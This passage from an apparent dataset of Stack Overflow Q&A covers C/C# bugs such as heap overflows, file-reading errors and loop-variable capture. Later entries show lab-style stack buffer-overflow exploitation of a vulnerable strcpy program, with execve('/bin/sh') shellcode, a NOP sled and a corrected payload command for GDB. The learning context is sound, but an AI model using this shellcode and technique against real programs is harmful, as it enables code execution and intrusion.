        "Answer": "Perhaps not what OP had in mind, yet macros do the trick.\n#include <stdio.h>\n\nvoid study() {\n  printf(\"this is the second.\\n\");\n}\n\nvoid study2() {\n  int bold[4];\n  // can only modify this section BEGIN\n  // Without calling any \"call\" or \"jump\" function, \n  #define F1 study\n  #define F2 study2\n  #define study2() F2(); F1();\n  // can only modify this section END\n  printf(\"this is the first\\n\");\n}\n\nint main(int argc, char *argv[]) {\n  study2();\n  return 0;\n}\n\nOutput\nthis is the first\nthis is the second.\n\n\nMaybe violates <Also we cannot call the function of \"study\".>.  Depends on \"we\", if \"we\" is the portion of code between BEGIN ... END, it is OK.\nElse if \"we\" is anywhere in code, than maybe a direct approach:\nvoid study2() {\n  int bold[4];\n  // can only modify this section BEGIN\n  #define printf(x) printf(\"this is the first\\nthis is the second.\\n\")\n  // can only modify this section END\n  printf(\"this is the first\\n\");\n}\n\n\n@Peter Cordes suggests a 3rd way, where our modification does not call study().\nvoid study2() {\n  int bold[4];\n  // can only modify this section BEGIN\n  atexit(study);\n  // can only modify this section END\n  printf(\"this is the first\\n\");\n}\n\n",
        "Source": "https://stackoverflow.com/questions/77399108/c-problem-about-compiler-and-memory-theory"
    },
    {
        "Title": "&#39;malloc(): corrupted top size&#39; After allocating more than 200K int",
        "Question": "I got assignment to do Bucket Sort with openMP, and I decided to do Quick Sort on each bucket. The requirement wants me to test by keep increasing the amount of integers and change the number of thread until reaching 1 million integers with 16 threads.\nHere's my code in C:\n#include <stdio.h>\n#include <omp.h>\n#include <time.h>\n#include <stdlib.h>\n#include <math.h>\n\nvoid swap(int* a, int* b) {\n    int temp = *a;\n    *a = *b;\n    *b = temp;\n\n}\n\nint partition(int arr[], int low, int high) {\n\n    int pivot = arr[high];\n    int i = low - 1;\n\n    for (int j = low; j < high; j++) {\n\n        if (arr[j] <= pivot) {\n            i++;\n            swap(&arr[i], &arr[j]);\n        }\n\n    }\n\n    swap(&arr[i + 1], &arr[high]);\n\n    return (i + 1);\n}\n\nvoid quickSort(int arr[], int low, int high) {\n\n    if (low < high) {\n        int pi = partition(arr, low, high);\n\n        quickSort(arr, low, pi - 1);\n        quickSort(arr, pi + 1, high);\n    }\n\n}\n\nint main(int argc, char* argv[]) {\n\n    //Check arguments\n    if (argc > 3 || argc < 3) {\n        fprintf(stderr, \"Error: Invalid arguments. This program require 2 arguments.\\nUsage: ./bucketSort <thread number> <amount of random number>\\n\");\n        return 1;\n    }\n\n    printf(\"Random seed\");\n\n    //Initialize random seed\n    srand((unsigned)time(NULL));\n\n    int threadNum = atoi(argv[1]);\n    int randomTime = atoi(argv[2]);\n\n    int* numArr = (int*)malloc(randomTime * sizeof(int));\n\n    if(numArr == NULL){\n        fprintf(stderr, \"Error: Unable to allocate memory.\");\n        return 1;\n    }\n\n    printf(\"\\nStart random\");\n\n    //Since RAND_MAX is limited to 0x7FFF (32,767), so we need to get creative to random beyond RAND_MAX\n    for (int i = 0; i < randomTime; i++) {\n\n        int rand1 = rand();\n        int rand2 = rand();\n        int rand3 = rand();\n\n        int combinedRandom = ((rand1 % 100) * 1000) + ((rand2 % 100) * 10) + (rand3 % 10);\n\n        numArr[i] = combinedRandom;\n\n    }\n\n    printf(\"\\nFinished Random\");\n\n    double timeSpent = 0;\n\n    int rangePerBucket = ceil(99999 / threadNum);\n\n    int* outputArr = (int*)malloc(randomTime * sizeof(int));\n\n    int* groupMemberCount = (int*)malloc(threadNum * sizeof(int));\n\n    if(outputArr == NULL || groupMemberCount == NULL){\n        fprintf(stderr, \"Error: Unable to allocate memory.\");\n        return 1;\n    }\n\n    clock_t begin = clock();\n\n    printf(\"\\nStart parallel section.\");\n\n    #pragma omp parallel shared(numArr, outputArr, groupMemberCount) num_threads(threadNum)\n    {\n\n        int myID = omp_get_thread_num();\n        int totalThread = omp_get_num_threads();\n\n        int beginRange = myID * rangePerBucket;\n        int endRange = (myID + 1) * rangePerBucket - 1;\n\n        int* temp = (int*)omp_alloc(rangePerBucket * sizeof(int), omp_large_cap_mem_alloc);\n\n        if( temp == NULL ){\n            fprintf(stderr, \"Error: Thread %d is unable to allocate memory.\", myID);\n\n        }\n\n        int memberCount = 0;\n\n        //Put in bucket\n        for (int j = 0; j < randomTime; j++)\n        {\n            if (numArr[j] >= beginRange && numArr[j] <= endRange) {\n                temp[memberCount] = numArr[j];\n                memberCount++;\n            }\n        }\n\n        groupMemberCount[myID] = memberCount;\n\n        int* myGroup = (int*)omp_alloc(memberCount * sizeof(int), omp_large_cap_mem_alloc);\n\n        if( myGroup == NULL ){\n            fprintf(stderr, \"Error: Thread %d is unable to allocate memory.\", myID);\n        }\n\n        for (int i = 0; i < memberCount; i++) {\n            myGroup[i] = temp[i];\n        }\n\n        //Sort\n        quickSort(myGroup, 0, memberCount - 1);\n        printf(\"\\nThread %d of %d has finished sorting.\", myID, totalThread);\n\n        //Find the start of output array\n        int startIndex = 0;\n        for( int i = 0; i < myID; i++ ){\n            startIndex += groupMemberCount[i];\n        }\n\n        //Combine array\n        for (int k = 0; k < memberCount; k++) {\n\n            outputArr[startIndex + k] = myGroup[k];\n\n        }\n\n        printf(\"\\nArray from thread %d has combined.\", myID);\n\n        omp_free(myGroup, omp_large_cap_mem_alloc);\n        omp_free(temp, omp_large_cap_mem_alloc);\n    }\n\n    free(numArr);\n    free(outputArr);\n    free(groupMemberCount);\n\n    clock_t end = clock();\n\n    timeSpent = (double)(end - begin) / CLOCKS_PER_SEC;\n\n    printf(\"\\nTime spent sorting: %f seconds.\\n\", timeSpent);\n\n    return 0;\n}\n\nI compiled it with gcc -fopenmp ./bucketSort.c -o ./bucketSort. Everything runs fine until I start testing with 100K integers (I wrote 200K in the topic because my program allocate it twice). The program immediately return malloc(): corrupted top size after printing Finished Random (so the first 100K in numArr is fine?). This is the first time I used malloc() and omp_alloc(), so feel free to correct me if I've done something wrong. I'm running this code in Ubuntu WSL btw.\nWhat I've tried:\n\nI tried calloc() but the result is the same, error after 2nd calloc().\nI tried increase ulimit to unlimit.\n\n",
        "Answer": "Usually, valgrind or -fsanitize=address give good diagnostics for such errors.\nCompiling and linking with -fsanitize=address shows that there is a heap overflow on this line:\n                temp[memberCount] = numArr[j];\n\nThe memberCount variable is equal to rangePerBucket at this point.  Both are one less than randomTime.  But the temp array has only rangePerBucket elements, so that index is out of range.\n",
        "Source": "https://stackoverflow.com/questions/77303320/malloc-corrupted-top-size-after-allocating-more-than-200k-int"
    },
    {
        "Title": "How to represent ASCII code 16 as a character?",
        "Question": "[C language] [Linux]\n\"ASCII code 16 is represented by the control character \u2410 also known as the data link escape\"\nI want to take this character from the keyboard as an input to a program that allows you to do a buffer overflow. It works only if i overwrite an INT variable with this value: 1161258512.\nI don't know how to build this number because it s not possible to write the single character 16 as an input. I also tried with the escape sequence but it didn't work. Maybe i should use unicode to do that and write the first 2 characters (with the 16 included) of the 4 byte payload.\nI'm new to this kind of things so please if you know more i would really appreciate it\n",
        "Answer": "\nit s not possible to write the single character 16 as an input\n\nThis is a strange expression. DLE is 0x10, 16, as you know.\nHow to get this from the keyboard depends much of many things you did not disclose: what OS?\nThe control key on input\nThe effect of pressing control as you type a key is to mask bits 5 and 6, those with values 32 and 64, so this is your answer:\nyou can use Ctrl+P, Ctrl+p or Ctrl+0 since there 3 possible values:\n\n0 is 0x30\nP is 0x50\nP is 0x70\n\nBut to read this you need to prepare your keyboard driver.  Under Linux and family pos-Unix use raw input and under Windows call ReadConsoleInput or similar.\nIn short you save the input configuration, prepare it to some that suits your needs, such disabling echo and buffering, then read the key codes. And at the end you restore everything.\nMicrosoft have a Console Reference. Under Linux man is your friend. Look for raw io and ioctl\n",
        "Source": "https://stackoverflow.com/questions/77077702/how-to-represent-ascii-code-16-as-a-character"
    },
    {
        "Title": "Changing values in hex-editor properly",
        "Question": "I want to change a file (.ULNC) and successfully did so in the past when the decoded texts i change have the same length or when the value I want to replace is bigger then the one i want to replace it with by filling the blanks with 00\nNow I have the issue, that the opposite is the case and my \"new\" encoded text is a bigger length than the original one.\nTo be more clear:\nI want to replace 53 61 6D 48 51 5F 41 with 53 61 6D 44 69 76 69 6E 67 5F 41\nwhat I want to change\nAny help or hint would be greatly appreciated!\nI tried just copying the value in like you see in the screenshot.\nmy attempt\nHxD Hex Editor warns me, it will change the filesize. When I confirm, start the program and load the changed file, it causes a bufferoverflow and crashes.\nI also tried... deleting some 00 00 00 00 in a place I thought they were not needed, the program then also crashed, this time without bufferoverflow warning.\n",
        "Answer": "I did it by shortening 53 61 6D 44 69 76 69 6E 67 5F 41 in the file it got originally referenced to 53 61 6D 44 69 76 69 and so kept the same byte size as  53 61 6D 48 51 5F 41.\nWorks now.\n",
        "Source": "https://stackoverflow.com/questions/76983981/changing-values-in-hex-editor-properly"
    },
    {
        "Title": "Overflow when reading a file",
        "Question": "When reading a simple file, I keep overflowing and reading bytes out of the file despite making sure I get the size of the file in bytes prior to the read.\nHere is my current code:\nFILE* file;\nint error_no = fopen_s(&file, filepath, \"r\");\n\nif (error_no != 0 || file == 0) {\n    std::cout << \"Error whilst reading file: \" + error_no;\n}\n\nfseek(file, 0, SEEK_END);\nsize_t size = ftell(file);\n\nchar* fileAsString = (char*) malloc(size+1);\n\nfseek(file, 0, SEEK_SET);\nfread(fileAsString, 1, size, file);\n\nfileAsString[size] = 0;\n\nstd::cout << \"\\n\" << size << \"\\n\";\nstd::cout << fileAsString;\n\nfclose(file);\n\nI am expecting to open the file, push the stream to the end of the file and use ftell to find the number of characters in the file.\nThen I make a string buffer to copy the file's content into.\nThen finally I reset the file stream and read it into my string buffer. I complete this by adding the end-of-string character at the end of the buffer.\nSadly this is what I get:\n114\n#version 330 core\n\nlayout(location = 0) out vec4 color;\n\nvoid main()\n{\n        color = vec4(1.0, 0.0, 0.0, 1.0);\n}\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\nI checked and the file contains 107 characters, which explains the 114 length and 7 '=' characters that shouldn't be there.\nThe actual file contents are:\n#version 330 core\n\nlayout(location = 0) out vec4 color;\n\nvoid main()\n{\n    color = vec4(1.0, 0.0, 0.0, 1.0);\n}\n\nHope this is clear enough!\n",
        "Answer": "When you read a file with \"r\" mode, you are reading in text mode and your two-byte \\r\\n line endings are being converted to \\n strings in memory.  But ftell is returning the length of the file in bytes (with each newline counting for two bytes).  But you are marking the end of the string (by setting a null character) according to how  many bytes were in the file, as opposed to how many characters are in the string.  Since you have placed your null terminator past the end of the string, you have one character of junk for each newline in your original file.\nInstead, you probably want to preserve the bytes of the original file. To do this, try opening the file in \"rb\" mode to read it in binary mode which should prevent it from changing \\r\\n in the file to \\n in the string in memory.\n",
        "Source": "https://stackoverflow.com/questions/76958048/overflow-when-reading-a-file"
    },
    {
        "Title": "Index overflow in for loop with nested thread",
        "Question": "I am writing a testing utility (a WinForm) to check how a web site perform. To do so i set a number of request to make, with a list of parameters associated with requests. I can set the requests to happen in parallel or in sequence.\nIf i work in sequence everything is fine, but if i work in parallel i get a strange issue with the for loop.\nI know i may use Parallel.For but because i am investigating another bug related to parallelism i temporary used a regualr for, with a nested action executed directly or with a Task.Run().\nHere the problematic code :\nprivate void Run()\n{\n    ConcurrentBag<long> callTimes = new ConcurrentBag<long>();\n    int httpErrors = 0;\n    int progress = 0;\n\n    string uri = txtUrl.Text ?? string.Empty;\n    if (string.IsNullOrWhiteSpace(uri))\n        return;\n\n    Func<List<string>,int,long> testCall = (p,i) =>\n    {\n        try\n        {\n            using (var client = new HttpClient())\n            {\n                Stopwatch timer = new Stopwatch();\n                timer.Start();\n\n                string actualUrl = string.Format(uri, p.ToArray());\n                var getTask = client.GetAsync(actualUrl);\n                getTask.Wait();\n\n                timer.Stop();\n\n                var result = getTask.Result;\n                if (result == null || (int)result.StatusCode >= 400)\n                {\n                    txtErrors.ThreadSafeAppendText($\"Connection error {(result?.StatusCode.ToString() ?? \"NULL\")}'\\r\\n\");\n                    Interlocked.Increment(ref httpErrors);\n                }\n\n                return timer.ElapsedMilliseconds;\n            }\n        }\n        catch ( Exception actionErr)\n        {\n            txtErrors.ThreadSafeAppendText($\"Error while execution callAction {i} with parameters '{string.Join(\", \" , p)}' : \\r\\n\" + actionErr.Message);\n        }\n\n        return -1;\n    };\n\n    try\n    {\n        List<List<string>> parameters = this.ParseParameters();\n        int parametersCount = parameters.Count;\n        int executions = (int)updRequests.Value;\n\n        //used to randomly access parameters in a way suitable also for the parallel scenario (i precompute all the random number i need while parallel processing is not yet started)\n        Random rng = new Random();\n        List<int> randoms = new List<int>();\n        for (int i = 0; i < executions; i++)\n            randoms.Add(rng.Next(0, parametersCount));\n\n        //randoms.Count is guaranteed to be equal to executions \n\n\n        for ( int index = 0; index < executions; index++)\n        {\n            Action parallelAction = () =>\n            {\n                int currentIndex = index;\n                List<string> currentParameter = parameters[randoms[currentIndex] % parametersCount]; //<<--- strange overflow here currentIndex >= executions\n                callTimes.Add(testCall(currentParameter, currentIndex));\n\n                Interlocked.Increment(ref progress);\n\n                if (progress % 10 == 0)\n                    prbProgress.ThreadSafeAction(this.RefreshProgressBar, progress, executions);\n            };\n\n            if (chkParallelExecution.Checked)\n                Task.Run(parallelAction);\n            else\n                parallelAction();\n        }\n\n\n        this.Reporting(callTimes, httpErrors);\n    }\n    catch (Exception err)\n    {\n        txtErrors.ThreadSafeAppendText($\"Error while running stress test : \\r\\n\" + err.Message);\n    }\n}\n\nThe strange thing i don't understand is how the variable called currentIndex become >= executions variable, because only the loop manipulate those two variable and should enforce the opposite.\nSo i think i am missing something in my understanding on how parallel processing happen here.\n",
        "Answer": "There is a fairly well known issue with capturing loop variables.\nSo you should probably write\nfor ( int index = 0; index < executions; index++)\n{\n    int currentIndex = index;\n    Action parallelAction = () =>\n    {\n        ...\n\nAnother possible issue:\nparameters[randoms[currentIndex] % parametersCount];\n\nFor all you know the values in randoms could all be zero. Are you sure you don't want to create an array of 0..executions, and shuffle this instead?\nI can't see any obvious reasons why this example should fail however. But errors with indices etc should be rather obvious if you do some debugging.\n",
        "Source": "https://stackoverflow.com/questions/76874536/index-overflow-in-for-loop-with-nested-thread"
    },
    {
        "Title": "Not getting the expected output when running a shell code in a buffer overflow",
        "Question": "After finding the eip offset i'm trying to input some shell code to my program. With the following command run $(python -c 'print(\"A\"*108 + \"BBBB\")') i get the following output\nProgram received signal SIGSEGV, Segmentation fault.\n0x42424242 in ?? ()\n\nNow the problem occurs when i try to add my shell code. When i input\nrun $(python -c 'print(\"\\x90\"*63 + \"\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\" + \"B\" * 20)')\n\ni don't get what i was exepected, the return address being overwritten with B's, but i get the following\nProgram received signal SIGSEGV, Segmentation fault.\n0x90c290c2 in ?? ()\n\nIt does work, when i increase the number of B's to 48 and decrease the number of NOPs to 35, but i'm not quite understanding why this doesn't work with more NOPs and less B's for the return address. One other thing i do not understand is that i'm not seeing any NOPs in my stack.\n(gdb) x/200x $esp\n0xffffd2a0: 0x42424242  0x42424242  0x42424242  0x42424242\n0xffffd2b0: 0x42424242  0x42424242  0x42424242  0x42424242\n0xffffd2c0: 0x42424242  0x42424242  0x00424242  0x00000001\n0xffffd2d0: 0xffffd398  0x68e47ce5  0x9e780f0a  0x00000000\n0xffffd2e0: 0x00000000  0x00000000  0xffffd3e0  0x0804b519\n0xffffd2f0: 0x00000000  0x08049c76  0xffffd3e0  0x0804b52d\n0xffffd300: 0x00000000  0x00000000  0x00000000  0x0804968d\n0xffffd310: 0x00000040  0x0000000c  0x00000040  0x00000008\n0xffffd320: 0x00040000  0x00000040  0x00002000  0x00300000\n0xffffd330: 0x00090000  0x00040000  0x00002000  0x00008000\n0xffffd340: 0xffffd370  0xffffd3d4  0x00000002  0x00000001\n0xffffd350: 0x00000006  0x00000045  0x00000001  0x00300000\n0xffffd360: 0x000c0000  0x00000004  0x00000001  0x00000000\n0xffffd370: 0xffffffff  0x00000000  0x080e3620  0x00000000\n0xffffd380: 0x00000000  0x00000000  0xffffd3b0  0x080e3ff4\n0xffffd390: 0x00000002  0x00000000  0x00000000  0x08049688\n0xffffd3a0: 0x00000000  0x00000000  0x00000000  0x08049688\n0xffffd3b0: 0x0804968d  0x00000002  0xffffd3d4  0x00000000\n0xffffd3c0: 0x00000000  0x00000000  0xffffd3cc  0x00000000\n0xffffd3d0: 0x00000002  0xffffd5d2  0xffffd609  0x00000000\n0xffffd3e0: 0xffffd6a5  0xffffd6b5  0xffffd6c9  0xffffd6ff\n0xffffd3f0: 0xffffd70c  0xffffd746  0xffffd773  0xffffd78a\n0xffffd400: 0xffffd79e  0xffffd7d1  0xffffd80f  0xffffd826\n0xffffd410: 0xffffd83e  0xffffd881  0xffffd891  0xffffd89d\n0xffffd420: 0xffffd8bd  0xffffd8cc  0xffffd8ff  0xffffd90a\n0xffffd430: 0xffffd925  0xffffd93a  0xffffd94f  0xffffd95e\n0xffffd440: 0xffffd97e  0xffffd9ac  0xffffd9bb  0xffffd9c4\n0xffffd450: 0xffffda14  0xffffda22  0xffffda33  0xffffda48\n0xffffd460: 0xffffda60  0xffffda6c  0xffffdaf0  0xffffdb01\n0xffffd470: 0xffffdb35  0xffffdb64  0xffffdbb0  0xffffdbbf\n0xffffd480: 0xffffdbd4  0xffffdbeb  0xffffdc09  0xffffdc1d\n0xffffd490: 0xffffdc25  0xffffdc3b  0xffffdc6d  0xffffdc78\n0xffffd4a0: 0xffffdc80  0xffffdc99  0xffffdcb4  0xffffdcbf\n0xffffd4b0: 0xffffdcd0  0xffffdcef  0xffffdd21  0xffffdd35\n0xffffd4c0: 0xffffdd53  0xffffdd6a  0xffffdd83  0xffffdda1\n0xffffd4d0: 0xffffde16  0xffffde2c  0xffffde3c  0xffffdf08\n0xffffd4e0: 0xffffdf1a  0xffffdf50  0xffffdf6c  0xffffdf84\n0xffffd4f0: 0xffffdf9b  0x00000000  0x00000020  0xf7ffc570\n0xffffd500: 0x00000021  0xf7ffc000  0x00000033  0x000006f0\n0xffffd510: 0x00000010  0xbfebfbff  0x00000006  0x00001000\n0xffffd520: 0x00000011  0x00000064  0x00000003  0x08048034\n0xffffd530: 0x00000004  0x00000020  0x00000005  0x00000009\n0xffffd540: 0x00000007  0x00000000  0x00000008  0x00000000\n0xffffd550: 0x00000009  0x08049660  0x0000000b  0x000003e8\n0xffffd560: 0x0000000c  0x000003e8  0x0000000d  0x000003e8\n0xffffd570: 0x0000000e  0x000003e8  0x00000017  0x00000000\n0xffffd580: 0x00000019  0xffffd5bb  0x0000001a  0x00000002\n0xffffd590: 0x0000001f  0xffffdfc1  0x0000000f  0xffffd5cb\n0xffffd5a0: 0x0000001b  0x0000001c  0x0000001c  0x00000020\n0xffffd5b0: 0x00000000  0x00000000  0x62000000  0x9e72e32a\n\n\nI'm using Python 3. The shell code is 25 bytes long. I have already disabled ASLR.\nThis is my code in C\n#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char** argv){\n    char buffer[100];\n    strcpy(buffer, argv[1]);\n\n    return 0;\n}\n\n",
        "Answer": "Python3's string literals \"...\" default to UTF-8 (Unicode) encoding when printing, not 8-bit ASCII (ISO-8859-1/Latin-1). As a result extra characters are being output that renders your shellcode unusable.\nIf you were to run your Python command like:\npython -c 'print(\"\\x90\"*63 + \"\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\" + \"B\" * 20)' | hexdump -C\n\nPiping the output through hexdump can make the issue more obvious. The output will look something like:\n00000000  c2 90 c2 90 c2 90 c2 90  c2 90 c2 90 c2 90 c2 90  |................|\n*\n00000070  c2 90 c2 90 c2 90 c2 90  c2 90 c2 90 c2 90 c3 ab  |................|\n00000080  0b 5b 31 c3 80 31 c3 89  31 c3 92 c2 b0 0b c3 8d  |.[1..1..1.......|\n00000090  c2 80 c3 a8 c3 b0 c3 bf  c3 bf c3 bf 2f 62 69 6e  |............/bin|\n000000a0  2f 73 68 42 42 42 42 42  42 42 42 42 42 42 42 42  |/shBBBBBBBBBBBBB|\n000000b0  42 42 42 42 42 42 42 0a                           |BBBBBBB.|\n000000b8\n\nYou'll notice that the value C2 and C3 have been inserted into the middle of your code for those characters that are >= 0x80. As a result the output is no longer suitable as shellcode.\nIf you switch to using Python2 the problem would resolve itself since it doesn't default to a Unicode character set. Something that works for Python2 and Python3 is the use of byte string literals b'...' and use sys.stdout.buffer.write to output the bytes to standard output.\nA command like this should work in GDB:\nrun $(python -c \"import sys; sys.stdout.buffer.write(b'\\x90'*63 + b'\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68' + b'B' * 20)\")\n\n",
        "Source": "https://stackoverflow.com/questions/78100496/not-getting-the-expected-output-when-running-a-shell-code-in-a-buffer-overflow"
    },
    {
        "Title": "EIP doesn&#39;t get overwritten when perfoming a buffer overflow attack",
        "Question": "I was watching this video on youtube: https://www.youtube.com/watch?v=1S0aBV-Waeo and i was trying to do the same steps shown in the video, but i can't seem to overwrite the EIP. I don't know if it's because the gdb may have changed during the years, or if anything else has. What i get when i try to overflow is the following\nProgram received signal SIGSEGV, Segmentation fault.\n0x080491ac in main (\n    argc=<error reading variable: Cannot access memory at address 0x41414141>, \n    argv=<error reading variable: Cannot access memory at address 0x41414145>)\n    at example.c:9\n9   }\n\nI can't seem to overwrite the eip, no matter how large my input is. The code is the same as shown in the video with a smaller buffer size.\n#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char** argv){\n    char buffer[10];\n    strcpy(buffer, argv[1]);\n\n    return 0;\n}\n\nI also get asked the following when running my program in gdb for the first time\nThis GDB supports auto-downloading debuginfo from the following URLs:\n  <https://debuginfod.archlinux.org>\nEnable debuginfod for this session? (y or [n]) \n\nThis is the register info in gdb\n(gdb) info reg\neax            0x0                 0\necx            0xffffd6b2          -10574\nedx            0xffffd396          -11370\nebx            0x804bff4           134529012\nesp            0xffffd390          0xffffd390\nebp            0xffffd3a8          0xffffd3a8\nesi            0xffffd480          -11136\nedi            0xf7ffcb60          -134231200\neip            0x80491a3           0x80491a3 <main+61>\neflags         0x286               [ PF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n\n(gdb) x/20x $esp\n0xffffd390: 0xffffffff  0x4141d3d4  0x41414141  0x41414141\n0xffffd3a0: 0xffff0041  0xf7e1fe2c  0x00000000  0xf7c20af9\n0xffffd3b0: 0x00000000  0x00000000  0x080482e7  0xf7c20af9\n0xffffd3c0: 0x00000002  0xffffd474  0xffffd480  0xffffd3e0\n0xffffd3d0: 0xf7e1fe2c  0x0804907d  0x00000002  0xffffd474\n\nI'm compiling with the following flags\ngcc -o example2 -fno-stack-protector -no-pie -m32 -g -z execstack example2.c -w\n\nThe whole interaction on gdb\n(gdb) disassemble main\nDump of assembler code for function main:\n   0x080497d5 <+0>: lea    0x4(%esp),%ecx\n   0x080497d9 <+4>: and    $0xfffffff0,%esp\n   0x080497dc <+7>: push   -0x4(%ecx)\n   0x080497df <+10>:    push   %ebp\n   0x080497e0 <+11>:    mov    %esp,%ebp\n   0x080497e2 <+13>:    push   %ebx\n   0x080497e3 <+14>:    push   %ecx\n   0x080497e4 <+15>:    sub    $0x10,%esp\n   0x080497e7 <+18>:    call   0x804981c <__x86.get_pc_thunk.ax>\n   0x080497ec <+23>:    add    $0x9a808,%eax\n   0x080497f1 <+28>:    mov    %ecx,%edx\n   0x080497f3 <+30>:    mov    0x4(%edx),%edx\n   0x080497f6 <+33>:    add    $0x4,%edx\n   0x080497f9 <+36>:    mov    (%edx),%edx\n   0x080497fb <+38>:    sub    $0x8,%esp\n   0x080497fe <+41>:    push   %edx\n   0x080497ff <+42>:    lea    -0x12(%ebp),%edx\n   0x08049802 <+45>:    push   %edx\n   0x08049803 <+46>:    mov    %eax,%ebx\n   0x08049805 <+48>:    call   0x8049020\n   0x0804980a <+53>:    add    $0x10,%esp\n   0x0804980d <+56>:    mov    $0x0,%eax\n--Type <RET> for more, q to quit, c to continue without paging--\n   0x08049812 <+61>:    lea    -0x8(%ebp),%esp\n   0x08049815 <+64>:    pop    %ecx\n   0x08049816 <+65>:    pop    %ebx\n   0x08049817 <+66>:    pop    %ebp\n   0x08049818 <+67>:    lea    -0x4(%ecx),%esp\n   0x0804981b <+70>:    ret\nEnd of assembler dump.\n(gdb) break *0x08049805\nBreakpoint 1 at 0x8049805: file example.c, line 6.\n(gdb) break *0x08049812\nBreakpoint 2 at 0x8049812: file example.c, line 9.\n(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAA\nStarting program: /home/r3/buffer-overflows/bo in memory example/example AAAAAAAAAAAAAAAAAAAAAAAAA\n\nThis GDB supports auto-downloading debuginfo from the following URLs:\n  <https://debuginfod.archlinux.org>\nEnable debuginfod for this session? (y or [n]) \nDebuginfod has been disabled.\nTo make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.\n\nBreakpoint 1, 0x08049805 in main (argc=2, argv=0xffffd464) at example.c:6\n6       strcpy(buffer, argv[1]);\n(gdb) info reg\neax            0x80e3ff4           135151604\necx            0xffffd330          -11472\nedx            0xffffd306          -11514\nebx            0x80e3ff4           135151604\nesp            0xffffd2f0          0xffffd2f0\nebp            0xffffd318          0xffffd318\nesi            0x80e3ff4           135151604\nedi            0x1                 1\neip            0x8049805           0x8049805 <main+48>\neflags         0x292               [ AF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/20x $esp\n0xffffd2f0: 0xffffd306  0xffffd6a4  0x00000000  0x080497ec\n0xffffd300: 0x080ade17  0x080e7c04  0x08049030  0x080ae037\n0xffffd310: 0xffffd330  0x080e3ff4  0xffffd428  0x08049ceb\n0xffffd320: 0x00000021  0xffffd338  0x00067e1c  0x08049ceb\n0xffffd330: 0x00000002  0xffffd464  0xffffd470  0xffffd354\n(gdb) c\nContinuing.\n\nBreakpoint 2, main (\n    argc=<error reading variable: Cannot access memory at address 0x41414141>, \n    argv=<error reading variable: Cannot access memory at address 0x41414145>)\n    at example.c:9\n9   }\n(gdb) info reg\neax            0x0                 0\necx            0xffffd6b0          -10576\nedx            0xffffd312          -11502\nebx            0x80e3ff4           135151604\nesp            0xffffd300          0xffffd300\nebp            0xffffd318          0xffffd318\nesi            0x80e3ff4           135151604\nedi            0x1                 1\neip            0x8049812           0x8049812 <main+61>\neflags         0x286               [ PF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/20x $esp\n0xffffd300: 0x080ade17  0x41417c04  0x41414141  0x41414141\n0xffffd310: 0x41414141  0x41414141  0x41414141  0x00414141\n0xffffd320: 0x00000021  0xffffd338  0x00067e1c  0x08049ceb\n0xffffd330: 0x00000002  0xffffd464  0xffffd470  0xffffd354\n0xffffd340: 0x080e3ff4  0x0804968d  0x00000002  0xffffd464\n(gdb) c\nContinuing.\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0804981b in main (\n    argc=<error reading variable: Cannot access memory at address 0x41414141>, \n    argv=<error reading variable: Cannot access memory at address 0x41414145>)\n    at example.c:9\n9   }\n(gdb) info reg\neax            0x0                 0\necx            0x41414141          1094795585\nedx            0xffffd312          -11502\nebx            0x41414141          1094795585\nesp            0x4141413d          0x4141413d\nebp            0x41414141          0x41414141\nesi            0x80e3ff4           135151604\nedi            0x1                 1\neip            0x804981b           0x804981b <main+70>\neflags         0x10286             [ PF SF IF RF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/20x $esp\n0x4141413d: Cannot access memory at address 0x4141413d\n(gdb) c\nContinuing.\n\nProgram terminated with signal SIGSEGV, Segmentation fault.\nThe program no longer exists.\n\n",
        "Answer": "This code\n   0x08049815 <+64>:    pop    %ecx\n   0x08049816 <+65>:    pop    %ebx\n   0x08049817 <+66>:    pop    %ebp\n   0x08049818 <+67>:    lea    -0x4(%ecx),%esp\n   0x0804981b <+70>:    ret\n\nrestores registers from their saved location on stack. However, you've overwritten the stack contents, so all the registers are now set to 0x4141... values. And that causes the lea    -0x4(%ecx),%esp instruction to SIGSEGV, since ECX points to inaccessible memory.\nAs ssbssa commented, this is happening due to stack realignment (which itself is needed to deal with 64-bit aligned (newer) AVX etc.).\nIf I turn stack realignment off with -mpreferred-stack-boundary=2, the code becomes:\n   0x08049176 <+0>:     push   %ebp\n   0x08049177 <+1>:     mov    %esp,%ebp\n   0x08049179 <+3>:     sub    $0xc,%esp\n   0x0804917c <+6>:     mov    0xc(%ebp),%eax\n   0x0804917f <+9>:     add    $0x4,%eax\n   0x08049182 <+12>:    mov    (%eax),%eax\n   0x08049184 <+14>:    push   %eax\n   0x08049185 <+15>:    lea    -0xa(%ebp),%eax\n   0x08049188 <+18>:    push   %eax\n   0x08049189 <+19>:    call   0x8049050 <strcpy@plt>\n   0x0804918e <+24>:    add    $0x8,%esp\n   0x08049191 <+27>:    mov    $0x0,%eax\n   0x08049196 <+32>:    leave\n   0x08049197 <+33>:    ret\n\nand the RIP overwrite works:\nProgram received signal SIGSEGV, Segmentation fault.\n0x41414141 in ?? ()\n(gdb) x/i $pc\n=> 0x41414141:  Cannot access memory at address 